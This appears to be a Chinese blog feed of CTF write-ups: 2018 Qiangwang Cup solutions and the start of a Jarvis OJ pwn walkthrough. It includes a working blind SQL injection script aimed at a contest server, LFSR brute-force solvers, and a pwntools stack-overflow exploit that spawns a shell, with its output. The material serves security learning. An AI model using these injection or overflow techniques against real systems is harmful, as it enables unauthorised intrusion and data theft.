<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">#! /usr/bin/env python3</div><div class="line"># Author : sn00py</div><div class="line"></div><div class="line">import requests</div><div class="line">import binascii</div><div class="line"></div><div class="line">url_register = &quot;http://39.107.32.29:10000/index.php?func=register&quot;</div><div class="line">url_login = &quot;http://39.107.32.29:10000/index.php?func=login&quot;</div><div class="line">result = &apos;[*]result:&apos;</div><div class="line">for i in range(1, 65):</div><div class="line">    for j in range(32, 127):</div><div class="line">        # age = &quot;9527 or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1),&#123;0&#125;,1))=&#123;1&#125;#&quot;.format(str(i), str(j))</div><div class="line">        # age = &quot;9527 or ascii(substr((select column_name from information_schema.columns where table_name = &apos;flag&apos; limit 1),&#123;0&#125;,1))=&#123;1&#125;#&quot;.format(str(i), str(j))</div><div class="line">        age = &quot;9527 or ascii(substr((select flag from flag limit 1),&#123;0&#125;,1))=&#123;1&#125;#&quot;.format(str(i), str(j))</div><div class="line">        age = binascii.hexlify(bytes(age, &apos;utf8&apos;))</div><div class="line">        age = &quot;0x&quot; + str(age, &quot;utf8&quot;)</div><div class="line">        username = &quot;np7g&#123;0&#125;&#123;1&#125;&quot;.format(str(i), str(j))</div><div class="line">        data = &#123;</div><div class="line">            &quot;username&quot;: username,</div><div class="line">            &quot;password&quot;: &quot;123456&quot;,</div><div class="line">            &quot;age&quot;: age</div><div class="line">        &#125;</div><div class="line">        # 注册</div><div class="line">        while True:</div><div class="line">            try:</div><div class="line">                resp1 = requests.post(url=url_register, data=data, allow_redirects=False)</div><div class="line">                # print(&quot;[+]&#123;&#125; 注册成功.&quot;.format(username))</div><div class="line">                break</div><div class="line">            except Exception as e:</div><div class="line">                # print(&quot;[+]&#123;&#125; 注册失败.&quot;.format(username))</div><div class="line">                continue</div><div class="line">        # 登陆</div><div class="line">        while True:</div><div class="line">            try:</div><div class="line">                resp2 = requests.post(url=url_login, data=data, allow_redirects=True)</div><div class="line">                if &quot;&lt;a&gt;123&lt;/a&gt;&quot; in resp2.text:</div><div class="line">                    result += chr(j)</div><div class="line">                    print(result)</div><div class="line">                # print(&quot;[+]&#123;&#125; 登陆成功.&quot;.format(username))</div><div class="line">                break</div><div class="line">            except Exception as e:</div><div class="line">                # print(&quot;[+]&#123;&#125; 登陆失败.&quot;.format(username))</div><div class="line">                continue</div></pre></td></tr></table></figure>
<h3 id="ai-nimals"><a href="#ai-nimals" class="headerlink" title="ai-nimals"></a>ai-nimals</h3><p><img src="/2018/03/24/第二届强网杯部分Writeup/13.jpg" alt="源码2"><br>多次发送狗狗图片的base64编码得到</p>
<h3 id="streamgame1"><a href="#streamgame1" class="headerlink" title="streamgame1"></a>streamgame1</h3><p>位数不是很大，爆破即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R,mask)</span>:</span></div><div class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></div><div class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffff</span></div><div class="line">    lastbit=<span class="number">0</span></div><div class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</div><div class="line">        lastbit^=(i&amp;<span class="number">1</span>)</div><div class="line">        i=i&gt;&gt;<span class="number">1</span></div><div class="line">    output^=lastbit</div><div class="line">    <span class="keyword">return</span> (output,lastbit)</div><div class="line"></div><div class="line">mask    =   <span class="number">0b1010011000100011100</span></div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">"key"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</div><div class="line">    a = f.read()</div><div class="line"></div><div class="line"><span class="keyword">for</span> init <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">19</span>):</div><div class="line">    R = init</div><div class="line">    ok = <span class="keyword">True</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</div><div class="line">        tmp=<span class="number">0</span></div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">            (R,out)=lfsr(R,mask)</div><div class="line">            tmp=(tmp &lt;&lt; <span class="number">1</span>)^out</div><div class="line">        <span class="keyword">if</span> tmp != a[i]:</div><div class="line">            ok = <span class="keyword">False</span></div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">if</span> ok:</div><div class="line">        print(<span class="string">'flag&#123;%s&#125;'</span> % bin(init)[<span class="number">2</span>:])</div><div class="line">        <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<h4 id="得到flag-flag-1110101100001101011"><a href="#得到flag-flag-1110101100001101011" class="headerlink" title="得到flag  flag{1110101100001101011}"></a>得到flag  flag{1110101100001101011}</h4><h3 id="streamgame2"><a href="#streamgame2" class="headerlink" title="streamgame2"></a>streamgame2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#根据streamgame2.py 可以得到flag长度为27</span></div><div class="line"><span class="comment">#所以这里爆破一下就可以get flag了</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R,mask)</span>:</span></div><div class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></div><div class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffff</span></div><div class="line">    lastbit=<span class="number">0</span></div><div class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</div><div class="line">        lastbit^=(i&amp;<span class="number">1</span>)</div><div class="line">        i=i&gt;&gt;<span class="number">1</span></div><div class="line">    output^=lastbit</div><div class="line">    <span class="keyword">return</span> (output,lastbit)</div><div class="line"></div><div class="line"></div><div class="line">f = open(<span class="string">'key'</span>,<span class="string">'rb'</span>)</div><div class="line">c = f.read()</div><div class="line"><span class="keyword">print</span> len(c),c.encode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> cx <span class="keyword">in</span> range(<span class="number">1048578</span>,<span class="number">9999999</span>):</div><div class="line">    flag = <span class="string">'flag&#123;%s&#125;'</span>%bin(cx).replace(<span class="string">'0b'</span>,<span class="string">''</span>)</div><div class="line">    R=int(flag[<span class="number">5</span>:<span class="number">-1</span>],<span class="number">2</span>)</div><div class="line">    mask=<span class="number">0x100002</span></div><div class="line"></div><div class="line">    x = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</div><div class="line">        tmp=<span class="number">0</span></div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">            (R,out)=lfsr(R,mask)</div><div class="line">            tmp=(tmp &lt;&lt; <span class="number">1</span>)^out</div><div class="line">        x += chr(tmp)</div><div class="line"> </div><div class="line"></div><div class="line">    <span class="keyword">if</span> x.encode(<span class="string">'hex'</span>) == <span class="string">'b2e90e13a06a1bfc40e67d53'</span>:</div><div class="line">        <span class="keyword">print</span> x,cx,flag</div><div class="line">        Break</div></pre></td></tr></table></figure>
<p>即可得到flag<br><img src="/2018/03/24/第二届强网杯部分Writeup/14.jpg" alt="源码2"></p>
<h3 id="streamgame4"><a href="#streamgame4" class="headerlink" title="streamgame4"></a>streamgame4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;iostream&gt;</span></div><div class="line"><span class="comment">#include &lt;bitset&gt;  </span></div><div class="line"></div><div class="line">using std::bitset;  </div><div class="line">using namespace std;</div><div class="line"></div><div class="line">char bin[<span class="number">8</span>] = &#123;</div><div class="line">	<span class="number">0xD1</span>, <span class="number">0xD9</span>, <span class="number">0x40</span>, <span class="number">0x43</span>, <span class="number">0x93</span>, <span class="number">0x53</span>, <span class="number">0x1E</span>, <span class="number">0x5E</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line">void nlfsr(int R,int mask,int &amp; output,int &amp; lastbit)&#123;</div><div class="line">	output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span>;</div><div class="line">    int i=(R&amp;mask)&amp;<span class="number">0xffffff</span>;</div><div class="line">    lastbit=<span class="number">0</span>;</div><div class="line">    int changesign=<span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span> (i!=<span class="number">0</span>)&#123;</div><div class="line">    	<span class="keyword">if</span> (changesign==<span class="number">1</span>)&#123;</div><div class="line">    		lastbit &amp;= (i &amp; <span class="number">1</span>);</div><div class="line">            changesign=<span class="number">0</span>;</div><div class="line">		&#125;<span class="keyword">else</span>&#123;</div><div class="line">			lastbit^=(i&amp;<span class="number">1</span>);</div><div class="line">		&#125;</div><div class="line">        i=i&gt;&gt;<span class="number">1</span>;</div><div class="line">	&#125;</div><div class="line">    output^=lastbit;</div><div class="line">&#125;</div><div class="line">int check(int flag)&#123;</div><div class="line">	char bin[]=&#123;<span class="number">209</span>,<span class="number">217</span>,<span class="number">64</span>,<span class="number">67</span>,<span class="number">147</span>,<span class="number">83</span>,<span class="number">30</span>,<span class="number">94</span>&#125; ;</div><div class="line">	int R=flag,t=<span class="number">0</span>;</div><div class="line">	int mask=<span class="number">1783406</span>;int tmp=<span class="number">0</span>;</div><div class="line">	<span class="keyword">for</span>(int i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</div><div class="line">		tmp=<span class="number">0</span>;</div><div class="line">		<span class="keyword">for</span>(int j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j++)&#123;</div><div class="line">			int ROut=<span class="number">0</span>,out=<span class="number">0</span>;</div><div class="line">			nlfsr(R,mask,ROut,out);</div><div class="line">			R=ROut;</div><div class="line">			tmp=(tmp &lt;&lt; <span class="number">1</span>)^out;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>((char)tmp==bin[i])&#123;</div><div class="line">			t++;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span>(t==<span class="number">8</span>)</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125; </div><div class="line"></div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">	<span class="keyword">for</span>(int i=<span class="number">0</span>;i&lt;<span class="number">1048576</span>;i++)&#123;</div><div class="line">		<span class="keyword">if</span>(check(i+<span class="number">1048576</span>)==<span class="number">1</span>)&#123;</div><div class="line">			bitset&lt;<span class="number">21</span>&gt; bst=i+<span class="number">1048576</span>;</div><div class="line">			cout &lt;&lt;<span class="string">"Flag Found!flag:"</span>&lt;&lt;bst&lt;&lt;endl;</div><div class="line">			system(<span class="string">"pause"</span>);</div><div class="line">			<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">		&#125;</div><div class="line">			</div><div class="line">	&#125;</div><div class="line">	cout &lt;&lt;<span class="string">"Failed to search flag!"</span>&lt;&lt;endl;</div><div class="line">	system(<span class="string">"pause"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>得到flag Flag Found!flag:100100111010101101011</p>
<h3 id="Simplecheck"><a href="#Simplecheck" class="headerlink" title="Simplecheck"></a>Simplecheck</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span> </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"math.h"</span> </span></div><div class="line"><span class="comment">/*求一元二次方程ax*x+bx+c=0的解*/</span> </div><div class="line"><span class="keyword">float</span> n1[] = &#123; <span class="number">0</span>, <span class="number">146527998</span>, <span class="number">205327308</span>, <span class="number">94243885</span>, <span class="number">138810487</span>, <span class="number">408218567</span>, <span class="number">77866117</span>, <span class="number">71548549</span>, <span class="number">563255818</span>, <span class="number">559010506</span>, <span class="number">449018203</span>, <span class="number">576200653</span>, <span class="number">307283021</span>, <span class="number">467607947</span>, <span class="number">314806739</span>, <span class="number">341420795</span>, <span class="number">341420795</span>, <span class="number">469998524</span>, <span class="number">417733494</span>, <span class="number">342206934</span>, <span class="number">392460324</span>, <span class="number">382290309</span>, <span class="number">185532945</span>, <span class="number">364788505</span>, <span class="number">210058699</span>, <span class="number">198137551</span>, <span class="number">360748557</span>, <span class="number">440064477</span>, <span class="number">319861317</span>, <span class="number">676258995</span>, <span class="number">389214123</span>, <span class="number">829768461</span>, <span class="number">534844356</span>, <span class="number">427514172</span>, <span class="number">864054312</span> &#125;;</div><div class="line"><span class="keyword">float</span> n2[] = &#123; <span class="number">13710</span>, <span class="number">46393</span>, <span class="number">49151</span>, <span class="number">36900</span>, <span class="number">59564</span>, <span class="number">35883</span>, <span class="number">3517</span>, <span class="number">52957</span>, <span class="number">1509</span>, <span class="number">61207</span>, <span class="number">63274</span>, <span class="number">27694</span>, <span class="number">20932</span>, <span class="number">37997</span>, <span class="number">22069</span>, <span class="number">8438</span>, <span class="number">33995</span>, <span class="number">53298</span>, <span class="number">16908</span>, <span class="number">30902</span>, <span class="number">64602</span>, <span class="number">64028</span>, <span class="number">29629</span>, <span class="number">26537</span>, <span class="number">12026</span>, <span class="number">31610</span>, <span class="number">48639</span>, <span class="number">19968</span>, <span class="number">45654</span>, <span class="number">51972</span>, <span class="number">64956</span>, <span class="number">45293</span>, <span class="number">64752</span>, <span class="number">37108</span> &#125;;</div><div class="line"><span class="keyword">float</span> n3[] = &#123; <span class="number">38129</span>, <span class="number">57355</span>, <span class="number">22538</span>, <span class="number">47767</span>, <span class="number">8940</span>, <span class="number">4975</span>, <span class="number">27050</span>, <span class="number">56102</span>, <span class="number">21796</span>, <span class="number">41174</span>, <span class="number">63445</span>, <span class="number">53454</span>, <span class="number">28762</span>, <span class="number">59215</span>, <span class="number">16407</span>, <span class="number">64340</span>, <span class="number">37644</span>, <span class="number">59896</span>, <span class="number">41276</span>, <span class="number">25896</span>, <span class="number">27501</span>, <span class="number">38944</span>, <span class="number">37039</span>, <span class="number">38213</span>, <span class="number">61842</span>, <span class="number">43497</span>, <span class="number">9221</span>, <span class="number">9879</span>, <span class="number">14436</span>, <span class="number">60468</span>, <span class="number">19926</span>, <span class="number">47198</span>, <span class="number">8406</span>, <span class="number">64666</span> &#125;;</div><div class="line"><span class="keyword">float</span> n4[] = &#123; <span class="number">0</span>, <span class="number">-341994984</span>, <span class="number">-370404060</span>, <span class="number">-257581614</span>, <span class="number">-494024809</span>, <span class="number">-135267265</span>, <span class="number">54930974</span>, <span class="number">-155841406</span>, <span class="number">540422378</span>, <span class="number">-107286502</span>, <span class="number">-128056922</span>, <span class="number">265261633</span>, <span class="number">275964257</span>, <span class="number">119059597</span>, <span class="number">202392013</span>, <span class="number">283676377</span>, <span class="number">126284124</span>, <span class="number">-68971076</span>, <span class="number">261217574</span>, <span class="number">197555158</span>, <span class="number">-12893337</span>, <span class="number">-10293675</span>, <span class="number">93868075</span>, <span class="number">121661845</span>, <span class="number">167461231</span>, <span class="number">123220255</span>, <span class="number">221507</span>, <span class="number">258914772</span>, <span class="number">180963987</span>, <span class="number">107841171</span>, <span class="number">41609001</span>, <span class="number">276531381</span>, <span class="number">169983906</span>, <span class="number">276158562</span> &#125;;</div><div class="line"><span class="keyword">float</span> n5[<span class="number">34</span>];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></div><div class="line">&#123; </div><div class="line">	<span class="keyword">float</span> a,b,c,x1,x2,d,e; </div><div class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line">	<span class="keyword">while</span>(i&lt;<span class="number">34</span>)</div><div class="line">	&#123;</div><div class="line">		b = n3[i];</div><div class="line">		a = n2[i];</div><div class="line">		c = n4[i]-n1[i+<span class="number">1</span>];</div><div class="line">		e = n4[i]-n1[i];</div><div class="line">		d=b*b<span class="number">-4</span>*a*c; </div><div class="line">		<span class="keyword">if</span>(d &lt; <span class="number">0</span>) </div><div class="line">		<span class="built_in">printf</span>(<span class="string">"方程没有实数解。\n"</span>); </div><div class="line">		<span class="keyword">if</span> (d==<span class="number">0</span>) </div><div class="line">		&#123; </div><div class="line">		x1=(-b)/(<span class="number">2</span>*a); </div><div class="line">		<span class="built_in">printf</span>(<span class="string">"x1=%f\n"</span>,x1); </div><div class="line">		&#125; </div><div class="line">		<span class="keyword">if</span> (d&gt;<span class="number">0</span>) </div><div class="line">		&#123; </div><div class="line">		x1=(-b+<span class="built_in">sqrt</span>(d))/(<span class="number">2</span>*a); </div><div class="line">		x2=(-b-<span class="built_in">sqrt</span>(d))/(<span class="number">2</span>*a); </div><div class="line">		<span class="comment">//printf("x1=%f,x2=%f\n",x1,x2);</span></div><div class="line">		&#125;</div><div class="line">		n5[i] = x1+<span class="number">0.5</span>;  <span class="comment">//向上取整</span></div><div class="line">		i++;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">34</span>; j++)</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%c"</span>,(<span class="keyword">int</span>)n5[j]);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>结果<br>flag{MAth_i&amp;_GOOd_DON7_90V_7hInK?}</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Welcome&quot;&gt;&lt;a href=&quot;#Welcome&quot; class=&quot;headerlink&quot; title=&quot;Welcome&quot;&gt;&lt;/a&gt;Welcome&lt;/h2&gt;&lt;p&gt;  Stegsolve–&amp;gt;&lt;br&gt;  &lt;img src=&quot;/2018/03/24/第二届强网杯部分Writeup/7.jpg&quot; alt=&quot;网站入口&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Writeup" scheme="http://iosmosis.github.io/tags/Writeup/"/>
    
      <category term="Web" scheme="http://iosmosis.github.io/tags/Web/"/>
    
      <category term="强网杯" scheme="http://iosmosis.github.io/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ Pwn writeup</title>
    <link href="http://iosmosis.github.io/2018/03/21/Jarvis-OJ-Pwn-writeup/"/>
    <id>http://iosmosis.github.io/2018/03/21/Jarvis-OJ-Pwn-writeup/</id>
    <published>2018-03-21T07:16:36.000Z</published>
    <updated>2018-06-09T09:17:33.107Z</updated>
    
    <content type="html"><![CDATA[<p>此篇记录关于Jarvis OJ Pwn所有题目的writeup</p>
<h2 id="XMAN-level0"><a href="#XMAN-level0" class="headerlink" title="[XMAN]level0"></a>[XMAN]level0</h2><h4 id="进行chack"><a href="#进行chack" class="headerlink" title="进行chack"></a>进行chack</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[*] <span class="string">'/home/ios/Desktop/pwn0'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div></pre></td></tr></table></figure>
<ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文=""><br>NX开启 栈溢出保护关闭 <h4 id="附件拖入ida"><a href="#附件拖入ida" class="headerlink" title="附件拖入ida"></a>附件拖入ida</h4></the></li>
</ul>
<p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/1.jpg" alt="ida"></p>
<p>main函数里跳转到了vulnerable_function()</p>
<h4 id="跟进"><a href="#跟进" class="headerlink" title="跟进"></a>跟进</h4><p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/2.jpg" alt="ida1"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">可以看到<span class="built_in">read</span>可读的大小为0x200 512字节</div><div class="line">buf大小为0x80字节</div></pre></td></tr></table></figure>
<h4 id="查看函数窗口-找到callsystem-查看代码发现已经写好了shell"><a href="#查看函数窗口-找到callsystem-查看代码发现已经写好了shell" class="headerlink" title="查看函数窗口 找到callsystem() 查看代码发现已经写好了shell"></a>查看函数窗口 找到callsystem() 查看代码发现已经写好了shell</h4><p>屡一下流程 main函数跳转到了vulnerable_function()然后 read一个大小不超过512的字节 然后返回函数</p>
<p>思路很清晰了 我们需要将vulnerable_function()函数的返回地址覆盖为callsystem()函数的地址即可成功getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">buf <span class="number">0x80</span></div><div class="line">ebp <span class="number">0x8</span></div><div class="line">淹没bp <span class="number">0x80</span>+<span class="number">0x8</span></div><div class="line">callsystem_addr = <span class="number">0x400596</span></div></pre></td></tr></table></figure>
<h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'./pwn0'</span>)</div><div class="line"></div><div class="line">callsystem_addr = <span class="number">0x400596</span></div><div class="line"></div><div class="line">payload = <span class="string">'A'</span>*<span class="number">0x88</span> +p64(callsystem_addr)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~/Desktop$ python pwn0.py</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./pwn0'</span>: pid 3517</div><div class="line">[*] Switching to interactive mode</div><div class="line">Hello, World</div><div class="line">$ ls</div><div class="line">core               peda-session-pwn50.txt  pwn0.py    pwn50.py</div><div class="line">peda-session-pwn0.txt  pwn0               pwn50</div><div class="line">$</div></pre></td></tr></table></figure>
<p>成功getshell</p>
<h2 id="Tell-Me-Something"><a href="#Tell-Me-Something" class="headerlink" title="Tell Me Something"></a>Tell Me Something</h2><h3 id="先进行check"><a href="#先进行check" class="headerlink" title="先进行check"></a>先进行check</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~/Desktop$ checksec ./guestbook</div><div class="line">[*] <span class="string">'/home/ios/Desktop/guestbook'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div></pre></td></tr></table></figure>
<p>没开任何保护 64位ELF</p>
<h3 id="IDA分析程序"><a href="#IDA分析程序" class="headerlink" title="IDA分析程序"></a>IDA分析程序</h3><p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/4.jpg" alt="ida1"></p>
<p>可以看到程序 只是进行了 write read </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">good_game</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  FILE *v0; <span class="comment">// rbx</span></div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+Fh] [rbp-9h]</span></div><div class="line"></div><div class="line">  v0 = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    result = fgetc(v0);</div><div class="line">    buf = result;</div><div class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">-1</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    write(<span class="number">1</span>, &amp;buf, <span class="number">1u</span>LL);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>找到关键函数 good_game </p>
<h3 id="思路很简单-简单栈溢出并且覆盖ret为good-game地址即可"><a href="#思路很简单-简单栈溢出并且覆盖ret为good-game地址即可" class="headerlink" title="思路很简单 简单栈溢出并且覆盖ret为good_game地址即可"></a>思路很简单 简单栈溢出并且覆盖ret为good_game地址即可</h3><h3 id="good-game-地址："><a href="#good-game-地址：" class="headerlink" title="good_game 地址："></a>good_game 地址：</h3><p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/5.jpg" alt="ida1"><br>通过IDA即可找到  0x400620</p>
